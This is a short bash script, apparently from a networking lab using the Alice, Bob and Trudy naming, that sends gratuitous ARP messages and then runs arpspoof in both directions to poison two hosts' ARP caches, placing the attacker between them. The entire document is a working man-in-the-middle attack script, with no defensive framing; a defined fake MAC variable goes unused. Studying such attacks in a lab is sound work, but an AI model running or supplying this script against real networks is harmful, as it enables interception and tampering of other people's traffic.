# Define Alice and Bob's IP and MAC addresses
bob_ip="172.31.0.149"
bob_mac="00:16:3e:ec:40:33"
alice_ip="172.31.0.168"
alice_mac="00:16:3e:06:f9:b6"


# Define Trudy's fake MAC address
trudy_mac="00:16:3e:3d:17:94"

# Send gratuitous ARP message to Alice
echo "Sending gratuitous ARP message to Alice"
sudo arping -U -I eth0 -c 3 -s $alice_ip $alice_ip

# Send gratuitous ARP message to Bob
echo "Sending gratuitous ARP message to Bob"
sudo arping -U -I eth0 -c 3 -s $bob_ip $bob_ip

# Poison Alice's ARP cache
echo "Poisoning Alice's ARP cache"
sudo arpspoof -i eth0 -t $alice_ip $bob_ip &

# Poison Bob's ARP cache
echo "Poisoning Bob's ARP cache"
sudo arpspoof -i eth0 -t $bob_ip $alice_ip &
